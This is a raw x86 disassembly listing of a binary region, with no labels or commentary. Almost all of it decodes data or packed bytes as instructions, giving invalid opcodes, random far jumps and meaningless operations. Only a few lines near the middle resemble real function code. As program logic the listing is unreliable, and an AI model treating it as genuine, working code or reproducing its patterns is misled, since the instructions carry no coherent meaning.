  40f5cf:	(bad)  [ebx+0x7a8db701]
  40f5d5:	mov    ecx,DWORD PTR [edx-0x13]
  40f5d8:	push   0xffffffea
  40f5da:	sub    BYTE PTR [ecx+ebx*2+0x12],dh
  40f5de:	adc    BYTE PTR [esi-0x6c],0x28
  40f5e2:	xchg   ecx,eax
  40f5e3:	mov    ebp,0x4b572dc9
  40f5e8:	rcr    DWORD PTR [esi-0x5d],cl
  40f5eb:	cld    
  40f5ec:	rcl    BYTE PTR [edx+ecx*4],cl
  40f5ef:	mov    ebp,ebx
  40f5f1:	xchg   ebx,eax
  40f5f2:	xchg   edi,eax
  40f5f3:	mov    BYTE PTR [ecx-0x1cb5e08c],dh
  40f5f9:	xchg   ecx,eax
  40f5fa:	lds    esi,FWORD PTR [eax]
  40f5fc:	test   BYTE PTR [esi],ch
  40f5fe:	cmp    eax,0x6c601676
  40f603:	add    dh,cl
  40f605:	in     eax,0x44
  40f607:	sti    
  40f608:	fist   DWORD PTR [ebp-0x4f]
  40f60b:	xor    DWORD PTR [ebx],edi
  40f60d:	les    ebx,FWORD PTR [eax+eax*1]
  40f610:	xor    al,0xfc
  40f612:	shl    DWORD PTR [ebp-0x72ca33f4],cl
  40f618:	mov    bl,cl
  40f61a:	inc    ecx
  40f61b:	push   ds
  40f61c:	add    BYTE PTR [eax+0x2d],dh
  40f61f:	jg     0x40f652
  40f621:	and    al,0xd4
  40f623:	cmp    al,0x93
  40f625:	sbb    ch,BYTE PTR [ebx+0x4]
  40f628:	xchg   BYTE PTR [esi],dl
  40f62a:	sub    ecx,ebx
  40f62c:	pusha  
  40f62d:	arpl   WORD PTR [ecx+0x51143cb6],bp
  40f633:	inc    esi
  40f634:	test   BYTE PTR [ebx-0x37],ch
  40f637:	mov    cl,0xa7
  40f639:	xchg   BYTE PTR [ebx+0x1d49ed86],dh
  40f63f:	outs   dx,BYTE PTR ds:[esi]
  40f640:	popa   
  40f641:	add    al,0x64
  40f643:	loopne 0x40f5fd
  40f645:	pop    eax
  40f646:	xchg   DWORD PTR [ebx+0xc1e5cc],edi
  40f64c:	mov    edx,0x73ea73d3
  40f651:	loope  0x40f62b
  40f653:	xchg   ecx,eax
  40f654:	or     BYTE PTR [edx-0x48],0x9b
  40f658:	(bad)  
  40f659:	lds    eax,FWORD PTR [esi+0x62cf053d]
  40f65f:	pop    edi
  40f660:	rcl    BYTE PTR [edx-0x5],0x1
  40f664:	jecxz  0x40f612
  40f666:	out    0xa0,eax
  40f668:	stos   BYTE PTR es:[edi],al
  40f669:	shl    ebx,cl
  40f66b:	or     BYTE PTR [ebp-0x4e],dl
  40f66e:	stos   BYTE PTR es:[edi],al
  40f66f:	cmp    al,0xa0
  40f671:	pop    eax
  40f672:	das    
  40f673:	leave  
  40f674:	es dec ebx
  40f676:	aaa    
  40f677:	push   esp
  40f678:	add    ah,0xf8
  40f67b:	arpl   WORD PTR [ecx-0x1861f386],bx
  40f681:	xchg   BYTE PTR [ebx-0x70],cl
  40f684:	jo     0x40f6d7
  40f686:	pop    ss
  40f687:	int3   
  40f688:	inc    edi
  40f689:	(bad)  
  40f68a:	cmp    eax,0xd2561df9
  40f68f:	mov    BYTE PTR [ecx],cl
  40f691:	mov    esi,0xf1bf3c2d
  40f696:	and    DWORD PTR [ecx],0x2b
  40f699:	or     DWORD PTR [ebp-0x6d],edi
  40f69c:	cmp    BYTE PTR [edx+0x7eb3334c],0xa4
  40f6a3:	int    0xd2
  40f6a5:	les    ebp,FWORD PTR [ecx-0x13]
  40f6a8:	jns    0x40f6d7
  40f6aa:	in     eax,dx
  40f6ab:	add    al,0xec
  40f6ad:	div    DWORD PTR [ebx]
  40f6af:	inc    esp
  40f6b0:	xchg   esp,eax
  40f6b1:	lahf   
  40f6b2:	repnz push esi
  40f6b4:	or     BYTE PTR [ebx+0x4],dl
  40f6b7:	imul   ecx,DWORD PTR [edx-0x5050bffc],0xffffffb7
  40f6be:	int    0xd4
  40f6c0:	nop
  40f6c1:	into   
  40f6c2:	inc    eax
  40f6c3:	fsubr  QWORD PTR [edi]
  40f6c5:	stos   BYTE PTR es:[edi],al
  40f6c6:	jmp    0xeb1f:0xc681960e
  40f6cd:	xchg   edi,eax
  40f6ce:	leave  
  40f6cf:	dec    ecx
  40f6d0:	inc    eax
  40f6d1:	test   edx,0xad9e251e
  40f6d7:	sub    DWORD PTR [edx],edi
  40f6d9:	add    esp,DWORD PTR [ebp-0x3]
  40f6dc:	jae    0x40f704
  40f6de:	fisttp QWORD PTR [eax]
  40f6e0:	std    
  40f6e1:	aad    0xcd
  40f6e3:	cs ret 0x338c
  40f6e7:	jmp    0x920bc58d
  40f6ec:	repnz loopne 0x40f743
  40f6ef:	sub    edi,ebp
  40f6f1:	paddusw mm0,QWORD PTR [ecx-0x65]
  40f6f5:	loope  0x40f678
  40f6f7:	xchg   esp,eax
  40f6f8:	jge    0x40f75d
  40f6fa:	faddp  st(3),st
  40f6fc:	out    0x5c,al
  40f6fe:	dec    edx
  40f6ff:	outs   dx,BYTE PTR ds:[esi]
  40f700:	out    0x30,eax
  40f702:	dec    ebx
  40f703:	rcl    DWORD PTR [ecx+0x6df1fd03],1
  40f709:	xchg   esp,eax
  40f70a:	pop    ebx
  40f70b:	and    eax,0x64fd8473
  40f710:	pop    edi
  40f711:	jle    0x40f69f
  40f713:	call   0xf182:0x57dde767
  40f71a:	mov    esi,0x31d4a8a9
  40f71f:	lods   al,BYTE PTR ss:[esi]
  40f721:	cmp    BYTE PTR [edi+0x43924415],bl
  40f727:	enter  0x4fb,0x69
  40f72b:	mov    ah,0x1c
  40f72d:	mov    ebp,0x8c4b4752
  40f732:	jae    0x40f6df
  40f734:	mov    ebp,0x4100c45c
  40f739:	adc    BYTE PTR [eax],ch
  40f73b:	push   0xffffffb0
  40f73d:	popf   
  40f73e:	mov    edi,0xfc3ac925
  40f743:	fstp   DWORD PTR [ebx+edx*2+0x68]
  40f747:	cmp    BYTE PTR [edi+0x67],ah
  40f74a:	jmp    0x888d:0xd2395386
  40f751:	sbb    edx,DWORD PTR [ebx]
  40f753:	aas    
  40f754:	mov    ah,BYTE PTR ds:0x6599eacb
  40f75a:	nop
  40f75b:	push   0xfffffffc
  40f75d:	mov    ch,dh
  40f75f:	xlat   BYTE PTR ds:[ebx]
  40f760:	iret   
  40f761:	or     dh,BYTE PTR [edi]
  40f763:	mul    BYTE PTR [ecx-0x6e]
  40f766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f767:	(bad)  
  40f768:	sti    
  40f769:	hlt    
  40f76a:	int    0x97
  40f76c:	mov    WORD PTR [eax-0x28],?
  40f76f:	mov    ecx,0x88e7c91d
  40f774:	loope  0x40f705
  40f776:	add    eax,0x8c4123dd
  40f77b:	sti    
  40f77c:	aas    
  40f77d:	xchg   ecx,eax
  40f77e:	and    DWORD PTR [eax],ebp
  40f780:	jle    0x40f731
  40f782:	mov    WORD PTR [edx],fs
  40f784:	fwait
  40f785:	xchg   esi,eax
  40f786:	ins    DWORD PTR es:[edi],dx
  40f787:	pop    eax
  40f788:	(bad)  
  40f789:	and    al,0xd6
  40f78b:	icebp  
  40f78c:	test   al,0x8b
  40f78e:	enter  0x453,0x29
  40f792:	aas    
  40f793:	shl    BYTE PTR cs:[eax-0x6280b68a],cl
  40f79a:	iret   
  40f79b:	call   0xf521ed18
  40f7a0:	sub    al,0xdc
  40f7a2:	scas   eax,DWORD PTR es:[edi]
  40f7a3:	ins    BYTE PTR es:[edi],dx
  40f7a4:	cmp    eax,0xcf99d5be
  40f7a9:	dec    eax
  40f7aa:	call   0x7a4ce8cb
  40f7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7b0:	jg     0x40f773
  40f7b2:	and    BYTE PTR [ebx],bh
  40f7b4:	retf   
  40f7b5:	jnp    0x40f7d9
  40f7b7:	adc    ebp,DWORD PTR [esi]
  40f7b9:	lods   eax,DWORD PTR ds:[esi]
  40f7ba:	test   BYTE PTR [ecx],cl
  40f7bc:	ja     0x40f760
  40f7be:	ins    DWORD PTR es:[edi],dx
  40f7bf:	jbe    0x40f7b9
  40f7c1:	(bad)  
  40f7c2:	scas   al,BYTE PTR es:[edi]
  40f7c3:	ret    0x2b78
  40f7c6:	push   esp
  40f7c7:	jle    0x40f80b
  40f7c9:	jns    0x40f802
  40f7cb:	or     al,0xef
  40f7cd:	push   esp
  40f7ce:	leave  
  40f7cf:	sbb    eax,0x974b7dbc
  40f7d4:	clc    
  40f7d5:	lods   eax,DWORD PTR ds:[esi]
  40f7d6:	mov    al,0x46
  40f7d8:	adc    edi,DWORD PTR [ecx+0xb3d55ea]
  40f7de:	push   edi
  40f7df:	jp     0x569cbd50
  40f7e5:	(bad)  [ebx+0x61553423]
  40f7eb:	imul   edx,DWORD PTR [eax],0xa4087d4f
  40f7f1:	ret    
  40f7f2:	pop    ss
  40f7f3:	jp     0x40f7de
  40f7f5:	push   ss
  40f7f6:	and    ebp,eax
  40f7f8:	cmp    al,0x10
  40f7fa:	xor    al,0x8a
  40f7fc:	dec    ebx
  40f7fd:	fiadd  WORD PTR ds:0xb2d1b70e
  40f803:	(bad)
  40f807:	ds jb  0x40f7a0
  40f80a:	xchg   ebx,eax
  40f80b:	push   esp
  40f80c:	shr    BYTE PTR [ebx],cl
  40f80e:	jge    0x40f875
  40f810:	mov    ds:0x81d16b63,al
  40f815:	je     0x40f7cd
  40f817:	pushf  
  40f818:	aad    0x1b
  40f81a:	inc    eax
  40f81b:	rcl    BYTE PTR [ecx-0xa9c9c58],1
  40f821:	fadd   DWORD PTR [ebx-0x2c]
  40f824:	outs   dx,DWORD PTR ds:[esi]
  40f825:	sahf   
  40f826:	pop    ecx
  40f827:	(bad)  
  40f829:	(bad)  
  40f82a:	push   0x26d26f36
  40f82f:	adc    al,0xc5
  40f831:	jp     0x40f849
  40f833:	and    cl,ah
  40f835:	cld    
  40f836:	and    BYTE PTR [edx-0x6f321f95],al
  40f83c:	(bad)  
  40f83d:	(bad)
  40f840:	and    BYTE PTR ds:0x315885eb,0x43
  40f847:	clc    
  40f848:	pop    ecx
  40f849:	in     al,0xba
  40f84b:	sub    DWORD PTR [edi-0x4d],ecx
  40f84e:	mov    esp,0xf0a2f2fd
  40f853:	cmp    eax,0xeb1f9d64
  40f858:	jae    0x40f850
  40f85a:	icebp  
  40f85b:	xor    BYTE PTR [eax-0x4cb21bc1],bh
  40f861:	jmp    0xe722:0xd9c73332
  40f868:	loope  0x40f815
  40f86a:	ficomp DWORD PTR [esi-0x6c]
  40f86e:	pushf  
  40f86f:	inc    ebx
  40f870:	lods   al,BYTE PTR ds:[esi]
  40f871:	pop    edi
  40f872:	in     al,dx
  40f873:	fld1   
  40f875:	add    ebx,DWORD PTR [ecx+esi*2]
  40f878:	or     DWORD PTR [edi],0x180fb313
  40f87e:	pop    ds
  40f87f:	jmp    0x40f816
  40f881:	and    ebx,esi
  40f883:	mov    ecx,0x3dde7bd7
  40f888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f889:	mov    bh,0x9e
  40f88b:	inc    ebx
  40f88c:	ins    DWORD PTR es:[edi],dx
  40f88d:	pop    eax
  40f88e:	xchg   edx,eax
  40f88f:	data16 add al,0xce
  40f892:	addr16 mov ds:0x7cf3,al
  40f896:	ins    BYTE PTR es:[edi],dx
  40f897:	nop
  40f898:	inc    DWORD PTR [ebp+0x6c]
  40f89b:	push   esp
  40f89c:	push   0x77
  40f89e:	in     al,0x71
  40f8a0:	dec    eax
  40f8a1:	xchg   edi,eax
  40f8a2:	xchg   BYTE PTR [ecx],al
  40f8a4:	sbb    eax,0x170f7648
  40f8a9:	mov    dl,0x52
  40f8ab:	mov    bh,ah
  40f8ad:	ja     0x40f84f
  40f8af:	bound  esp,QWORD PTR ds:0xf8524947
  40f8b5:	or     BYTE PTR [ecx+0xcdf6169],ch
  40f8bb:	daa    
  40f8bc:	mov    ch,0xf1
  40f8be:	outs   dx,DWORD PTR ds:[esi]
  40f8bf:	mov    esi,0xead46f90
  40f8c4:	mov    BYTE PTR [esi],cl
  40f8c6:	stos   DWORD PTR es:[edi],eax
  40f8c7:	dec    eax
  40f8c8:	dec    eax
  40f8c9:	push   es
  40f8ca:	xchg   esp,eax
  40f8cb:	add    eax,0xa916b4de
  40f8d0:	(bad)  
  40f8d1:	ins    BYTE PTR es:[edi],dx
  40f8d2:	xchg   ebp,eax
  40f8d3:	(bad)  
  40f8d4:	aas    
  40f8d5:	mov    ebx,0xc9f0ccbb
  40f8da:	jg     0x40f953
  40f8dc:	lds    ebx,FWORD PTR [edx]
  40f8de:	mov    esi,?
  40f8e0:	sti    
  40f8e1:	or     ebp,DWORD PTR [ebx+0x5db3dd5b]
  40f8e7:	popf   
  40f8e8:	jp     0x40f909
  40f8ea:	pop    esi
  40f8eb:	stos   BYTE PTR es:[edi],al
  40f8ec:	mov    al,ds:0xa95650c3
  40f8f1:	xor    ecx,DWORD PTR [eax-0x40]
  40f8f4:	jge    0x40f964
  40f8f6:	ins    BYTE PTR es:[edi],dx
  40f8f7:	out    0xfc,eax
  40f8f9:	xor    eax,0x2dc6d4d5
  40f8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ff:	pop    es
  40f900:	repnz int 0x45
  40f903:	call   DWORD PTR [edi]
  40f905:	xchg   edi,eax
  40f906:	jnp    0x40f935
  40f908:	mov    ecx,DWORD PTR [ebp+0x8]
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	cmp    eax,DWORD PTR [eax-0x5470719c]
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f962
  40f944:	sub    al,0xbe
  40f946:	and    esi,edx
  40f948:	cmp    edi,esp
  40f94a:	sbb    ah,BYTE PTR [eax+0x767bce1e]
  40f950:	(bad)  
  40f951:	cs sub eax,0x28589e8
  40f957:	cmp    edx,ebp
  40f959:	je     0x40f987
  40f95b:	adc    bh,dl
  40f95d:	clc    
  40f95e:	mov    al,ds:0x50297048
  40f963:	js     0x40f920
  40f965:	outs   dx,BYTE PTR ds:[esi]
  40f966:	xor    eax,0x1906d3cb
  40f96b:	mov    cl,0xdc
  40f96d:	adc    BYTE PTR [edi-0x55],bh
  40f970:	mov    DWORD PTR [ebx+0x5fb4c1ba],esi
  40f976:	mov    ds:0x7bcb8156,al
  40f97b:	mov    ebp,0x1a6de52f
  40f980:	jp     0x40f991
  40f982:	ins    BYTE PTR es:[edi],dx
  40f983:	addr16 mov ds:0xfd10,eax
  40f987:	xchg   edx,eax
  40f988:	push   ds
  40f989:	pop    esp
  40f98a:	sbb    edi,edi
  40f98c:	in     al,dx
  40f98d:	or     eax,0x1c2bbbba
  40f992:	ret    
  40f993:	and    eax,0x7fe8819b
  40f998:	add    ah,ah
  40f99a:	jb     0x40f950
  40f99c:	mov    esi,0xf0990295
  40f9a1:	pop    es
  40f9a2:	mov    bh,BYTE PTR [edi+0x2f7d816e]
  40f9a8:	repnz sub ecx,ecx
  40f9ab:	clc    
  40f9ac:	ins    BYTE PTR es:[edi],dx
  40f9ad:	dec    ecx
  40f9ae:	or     BYTE PTR [ebx+edi*2+0x1f],ah
  40f9b2:	(bad)  
  40f9b3:	mov    ch,0xcc
  40f9b5:	or     eax,0x7d95cb1e
  40f9ba:	mov    bl,0x91
  40f9bc:	out    dx,al
  40f9bd:	sub    al,0xe2
  40f9bf:	xor    bh,BYTE PTR ds:0x68cb0762
  40f9c5:	xor    BYTE PTR [ebp+0x3d],dh
  40f9c8:	sbb    dl,ah
  40f9ca:	and    al,0xfe
  40f9cc:	inc    edi
  40f9cd:	ret    0x7b
  40f9d0:	retf   0xa8e4
  40f9d3:	xchg   DWORD PTR [esi-0x29e897e1],ecx
  40f9d9:	inc    ecx
  40f9da:	repnz lods eax,DWORD PTR ds:[esi]
  40f9dc:	mov    ebx,0x5fd667cd
  40f9e1:	xchg   DWORD PTR [eax-0x2f],ebp
  40f9e4:	cli    
  40f9e5:	out    dx,eax
  40f9e6:	jmp    0xb63ed269
  40f9eb:	outs   dx,DWORD PTR ds:[esi]
  40f9ec:	cmp    bh,ah
  40f9ee:	dec    esi
  40f9ef:	push   0x27fb98ed
  40f9f4:	mov    al,0xde
  40f9f6:	shl    ecx,cl
  40f9f8:	(bad)  
  40f9f9:	(bad)  
  40f9fa:	enter  0xa344,0x6a
  40f9fe:	push   0x5007f33c
  40fa03:	ficomp WORD PTR [ebp-0x2a]
  40fa06:	sub    bh,BYTE PTR [edi-0x23]
  40fa09:	push   esi
  40fa0a:	mov    dl,0x8f
  40fa0c:	sub    dh,cl
  40fa0e:	adc    esi,esi
  40fa10:	les    edi,FWORD PTR [edi]
  40fa12:	xlat   BYTE PTR ds:[ebx]
  40fa13:	add    bh,BYTE PTR [edx+0x41c75e3f]
  40fa19:	xchg   DWORD PTR [edx],ecx
  40fa1b:	je     0x40fa14
  40fa1d:	dec    edi
  40fa1e:	mov    dh,0xf
  40fa20:	mov    ebx,DWORD PTR [edi]
  40fa22:	js     0x40f9fc
  40fa24:	inc    eax
  40fa25:	push   0xdb0b4123
  40fa2a:	sbb    cl,dl
  40fa2c:	gs pusha 
  40fa2e:	sub    DWORD PTR [ebx+0x2c],ebp
  40fa31:	in     al,0x78
  40fa33:	jnp    0x40fa78
  40fa35:	mov    cl,0xb5
  40fa37:	dec    edx
  40fa38:	cmp    BYTE PTR [ecx-0x4f],dl
  40fa3b:	loop   0x40fa83
  40fa3d:	mov    gs,WORD PTR [edx+0x2f20f3d]
  40fa43:	call   0x5285a8fd
  40fa48:	(bad)  
  40fa49:	xor    BYTE PTR [esi+0x408efd37],0x54
  40fa50:	lods   al,BYTE PTR ds:[esi]
  40fa51:	in     al,0x22
  40fa53:	sbb    eax,0x77542ea6
  40fa58:	push   0xffffffcf
  40fa5a:	popa   
  40fa5b:	pop    eax
  40fa5c:	das    
  40fa5d:	ds mov edx,0x66c92c1c
  40fa63:	xlat   BYTE PTR ds:[ebx]
  40fa64:	rcl    cl,cl
  40fa66:	pop    edi
  40fa67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa68:	jmp    0x1beb:0xa926a829
  40fa6f:	cmc    
  40fa70:	div    BYTE PTR [esi]
  40fa72:	inc    edx
  40fa73:	mov    al,0xe
  40fa75:	mov    eax,0x6058a08f
  40fa7a:	xchg   esi,eax
  40fa7b:	add    al,0x9
  40fa7d:	aaa    
  40fa7e:	xor    eax,0xcd69c186
  40fa83:	or     esi,ebx
  40fa85:	or     eax,0x6c448f9d
  40fa8a:	mov    eax,0xbc51ad9f
  40fa8f:	loopne 0x40fade
  40fa91:	stc    
  40fa92:	push   edi
  40fa93:	repnz ins DWORD PTR es:[edi],dx
  40fa95:	push   ebp
  40fa96:	dec    ecx
  40fa97:	mov    eax,0xed013748
  40fa9c:	cmp    DWORD PTR [ecx+0xc7ba3b4],eax
  40faa2:	addr16 dec eax
  40faa4:	xor    edi,DWORD PTR ss:[eax]
  40faa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa8:	xor    esi,DWORD PTR [eax]
  40faaa:	int3   
  40faab:	ds jae 0x40fab5
  40faae:	daa    
  40faaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fab0:	push   0x5
  40fab2:	loopne 0x40fac8
  40fab4:	imul   edx,DWORD PTR [edi-0x306c42ba],0x1
  40fabb:	int    0x4c
  40fabd:	xor    ebp,DWORD PTR [ebx+0x3320c9]
  40fac3:	shr    BYTE PTR [eax],cl
  40fac5:	mov    ah,0xf5
  40fac7:	js     0x40fa74
  40fac9:	jns    0x40fafa
  40facb:	mov    ds:0x26b0c6b5,al
  40fad0:	into   
  40fad1:	sahf   
  40fad2:	in     eax,dx
  40fad3:	fadd   DWORD PTR [esi-0x64f7132d]
  40fad9:	and    edi,DWORD PTR [edi-0x2522661e]
  40fadf:	jmp    0x4f13bcc
  40fae4:	pop    ds
  40fae5:	jecxz  0x40fb39
  40fae7:	add    al,0x20
  40fae9:	out    dx,eax
  40faea:	add    BYTE PTR [ebx-0x75777494],dh
  40faf0:	sub    bl,BYTE PTR [esi+ebp*4]
  40faf3:	sub    DWORD PTR [ebx],esp
  40faf5:	gs xchg ebp,eax
  40faf7:	xor    eax,0xa1e381e5
  40fafc:	and    eax,0x68e5b355
  40fb01:	mov    ds:0x3c9e91d9,eax
  40fb06:	adc    ebp,DWORD PTR [ebx+ecx*4]
  40fb09:	xchg   esi,eax
  40fb0a:	add    BYTE PTR [esi],dl
  40fb0c:	add    ecx,ecx
  40fb0e:	jae    0x40fb6e
  40fb10:	cwde   
  40fb11:	xor    BYTE PTR [edi],0xbd
  40fb14:	lods   al,BYTE PTR ds:[esi]
  40fb15:	adc    esp,edx
  40fb17:	cdq    
  40fb18:	xor    eax,0x652e44fb
  40fb1d:	xchg   esi,ebx
  40fb1f:	data16 jge 0x40fab4
  40fb22:	jle    0x40fb55
  40fb24:	sbb    DWORD PTR [esp+esi*4-0x5ddef004],esp
  40fb2b:	sbb    al,0x58
  40fb2d:	cmp    bl,0xa7
  40fb30:	ret    
  40fb31:	retf   0xed41
  40fb34:	adc    eax,0x59aa5597
  40fb39:	adc    eax,0xdd9d9924
  40fb3e:	jb     0x40fb11
  40fb40:	retf   0x729d
  40fb43:	xor    edi,DWORD PTR es:[eax+0x40]
  40fb47:	push   0x283bb8c4
  40fb4c:	push   es
  40fb4d:	mov    al,0x2
  40fb4f:	pushf  
  40fb50:	adc    edx,ebx
  40fb52:	ins    BYTE PTR es:[edi],dx
  40fb53:	mov    ebp,0xb46c3935
  40fb58:	cli    
  40fb59:	cmp    dh,BYTE PTR [ecx]
  40fb5b:	jmp    0x40fb54
  40fb5d:	mov    ah,0x89
  40fb5f:	mov    ah,0x8a
  40fb61:	ret    0xdaca
  40fb64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb65:	les    ebx,FWORD PTR [eax]
  40fb67:	enter  0x879a,0x29
  40fb6b:	sub    eax,0x257b9446
  40fb70:	les    ebp,FWORD PTR gs:[eax]
  40fb73:	jbe    0x40fbb2
  40fb75:	imul   edx,eax,0xa1898fc
  40fb7b:	rcl    BYTE PTR [ebp-0xa],cl
  40fb7e:	fsub   st,st(1)
  40fb80:	call   0xf564:0xc6154c94
  40fb87:	sbb    BYTE PTR [ebx-0x5faafc58],dl
  40fb8d:	popa   
  40fb8e:	adc    BYTE PTR [esp+0x53],dh
  40fb92:	or     BYTE PTR fs:[ecx+0x6],cl
  40fb96:	push   es
  40fb97:	lods   al,BYTE PTR ds:[esi]
  40fb98:	sti    
  40fb99:	sub    DWORD PTR [eax],ecx
  40fb9b:	imul   esi,DWORD PTR [ecx+0x39f12751],0x90b61e25
  40fba5:	mov    esp,0xed9b8da9
  40fbaa:	in     eax,0x4c
  40fbac:	rol    BYTE PTR ds:0x1545a4f5,cl
  40fbb2:	push   es
  40fbb3:	cmp    ecx,edx
  40fbb5:	das    
  40fbb6:	adc    DWORD PTR [edx+0x1217dc21],eax
  40fbbc:	sbb    DWORD PTR [edx],edx
  40fbbe:	(bad)  [esi]
  40fbc0:	aas    
  40fbc1:	push   ds
  40fbc2:	push   esi
  40fbc3:	xchg   ecx,eax
  40fbc4:	sub    eax,0x583306d2
  40fbc9:	mov    ecx,0x4d9e7dda
  40fbce:	jmp    0x40fc31
  40fbd0:	adc    bl,al
  40fbd2:	jl     0x40fbec
  40fbd4:	ret    0x858e
  40fbd7:	lods   al,BYTE PTR ds:[esi]
  40fbd8:	adc    al,0xb8
  40fbda:	jne    0x40fc41
  40fbdc:	fs test al,0xd3
  40fbdf:	mov    ah,al
  40fbe1:	mov    esi,0x6fcd09e0
  40fbe6:	push   edi
  40fbe7:	ret    
  40fbe8:	(bad)
  40fbed:	adc    cl,bh
  40fbef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf1:	jg     0x40fb78
  40fbf3:	mov    ah,0x4b
  40fbf5:	and    DWORD PTR [edi+0x3],edi
  40fbf8:	pop    edx
  40fbf9:	iret   
  40fbfa:	pop    ebp
  40fbfb:	iret   
  40fbfc:	call   0x50a1051d
  40fc01:	push   ds
  40fc02:	inc    ebp
  40fc03:	mul    DWORD PTR ds:0x60593edb
  40fc09:	lds    ecx,FWORD PTR [edx+0x39]
  40fc0c:	repz std 
  40fc0e:	ss jl  0x40fc38
  40fc11:	push   cs
  40fc12:	pop    ss
  40fc13:	push   esi
  40fc14:	mov    ds:0x1a8186bd,al
  40fc19:	pop    ds
  40fc1a:	inc    ecx
  40fc1b:	call   0xac974e06
  40fc20:	mov    WORD PTR [edx+0x34],?
  40fc23:	push   eax
  40fc24:	and    bh,dl
  40fc26:	mov    ?,ebp
  40fc28:	leave  
  40fc29:	pop    esp
  40fc2a:	mov    ds:0x8b898075,al
  40fc2f:	pop    ebp
  40fc30:	stc    
  40fc31:	pop    edi
  40fc32:	(bad)  
  40fc33:	cmc    
  40fc34:	sbb    bh,BYTE PTR [eax-0x13]
  40fc37:	in     eax,0x6b
  40fc39:	sbb    dh,BYTE PTR ds:0x3e55aeb4
  40fc3f:	cld    
  40fc40:	dec    esp
  40fc41:	ret    0x1688
  40fc44:	mov    ah,BYTE PTR [esi]
  40fc46:	xchg   esp,eax
  40fc47:	pushf  
  40fc48:	or     dh,BYTE PTR [eax-0x63]
  40fc4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc4c:	mov    ?,ecx
  40fc4e:	mov    ds:0xe9b9d99b,al
  40fc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc54:	adc    al,0x6b
  40fc56:	push   eax
  40fc57:	xchg   edi,eax
  40fc58:	aaa    
  40fc59:	pop    eax
  40fc5a:	mov    ecx,0x37db7f23
  40fc5f:	mov    edi,0x204becbc
  40fc64:	push   edi
  40fc65:	inc    esi
  40fc66:	cmc    
  40fc67:	xor    BYTE PTR [esi],cl
  40fc69:	adc    eax,0x5199736c
  40fc6e:	mov    bl,BYTE PTR [eax+ebx*2+0x6c]
  40fc72:	lds    edi,FWORD PTR [ecx-0x1a1a2033]
  40fc78:	jg     0x40fbfd
  40fc7a:	jmp    0x40fca8
  40fc7c:	outs   dx,BYTE PTR ds:[esi]
  40fc7d:	sahf   
  40fc7e:	xor    ebx,DWORD PTR [ebx-0x593285d3]
  40fc84:	leave  
  40fc85:	dec    ebx
  40fc86:	pop    ss
  40fc87:	push   0xfe71c361
  40fc8c:	in     eax,0x1b
  40fc8e:	test   eax,0x5e8a41e8
  40fc93:	jo     0x40fcea
  40fc95:	adc    eax,0x42a02df
  40fc9a:	and    cl,0xf1
  40fc9d:	es jo  0x40fc47
  40fca0:	push   ss
  40fca1:	ja     0x40fcfd
  40fca3:	dec    esp
  40fca4:	sbb    al,0x5
  40fca6:	sbb    eax,0x9fde205c
  40fcab:	jl     0x40fd0b
  40fcad:	xchg   esi,eax
  40fcae:	test   eax,0x57625c10
  40fcb3:	inc    ecx
  40fcb4:	push   cs
  40fcb5:	dec    ecx
  40fcb6:	outs   dx,DWORD PTR ds:[esi]
  40fcb7:	pop    edx
  40fcb8:	call   0xffb4:0x45cae3c2
  40fcbf:	(bad)  
  40fcc0:	pop    ds
  40fcc1:	cmp    ah,dh
  40fcc3:	mov    bh,0x44
  40fcc5:	mov    dh,0x42
  40fcc7:	jnp    0x40fcac
  40fcc9:	or     ah,BYTE PTR [ebx-0x64]
  40fccc:	push   cs
  40fccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcce:	hlt    
  40fccf:	ins    BYTE PTR es:[edi],dx
  40fcd0:	jnp    0x40fc9c
  40fcd2:	jne    0x40fcb3
  40fcd4:	push   cx
  40fcd6:	lods   eax,DWORD PTR ds:[esi]
  40fcd7:	push   0xffffffd5
  40fcd9:	bound  esi,QWORD PTR [edx-0x3d]
  40fcdc:	sbb    ebp,DWORD PTR [edi-0x66]
  40fcdf:	js     0x40fd42
  40fce1:	ret    0x1578
  40fce4:	pop    esi
  40fce5:	mov    eax,ds:0xac987bd8
  40fcea:	push   esi
  40fceb:	pop    ds
  40fcec:	xlat   BYTE PTR ds:[ebx]
  40fced:	jg     0x40fcea
  40fcef:	mov    ch,0x8c
  40fcf1:	xor    al,0xea
  40fcf3:	daa    
  40fcf4:	and    esp,esp
  40fcf6:	mov    eax,ds:0x9787d3d
  40fcfb:	xchg   esp,eax
  40fcfc:	dec    esp
  40fcfd:	(bad)  
  40fcfe:	mov    al,0x44
  40fd00:	push   0x8d3936c6
  40fd05:	mov    cl,0x17
  40fd07:	jne    0x40fd12
  40fd09:	mov    fs,WORD PTR [edx+0x1]
  40fd0c:	add    eax,0xe0113509
  40fd11:	adc    ch,BYTE PTR [ebx+0x63]
  40fd14:	ins    DWORD PTR es:[edi],dx
  40fd15:	or     DWORD PTR [ebx-0x6d],ebp
  40fd18:	ret    0x35f5
  40fd1b:	push   ebp
